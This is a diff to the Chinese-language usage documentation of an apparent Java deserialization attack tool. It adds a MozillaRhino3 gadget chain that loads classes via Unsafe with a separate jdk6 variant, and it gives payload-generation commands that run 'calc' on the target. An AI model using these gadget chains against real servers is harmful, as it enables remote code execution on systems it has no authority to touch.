@@ -265,6 +265,18 @@ winlinux
 -m YsoAttack -g MozillaRhino2 -a "auto_cmd:calc"
 ```
 
+#### MozillaRhino3
+
+描述：利用js Engine来触发最终的漏洞利用
+
+工具：js Engine使用Unsafe的方式来加载，区分jdk6和其他jdk版本的原因是jdk6的Unsafe没有defineAnonymousClass该fang'f
+
+```bash
+-m YsoAttack -g MozillaRhino3 -a "jdk6:auto_cmd:calc"
+
+-m YsoAttack -g MozillaRhino3 -a "jdk:auto_cmd:calc"
+```
+
 ### JRMP 协议打法
 
 JRMP是RMI通信的时候使用协议，该协议传输数据时候通过Java序列化协议来操作。JRMP系列打法步骤如下：
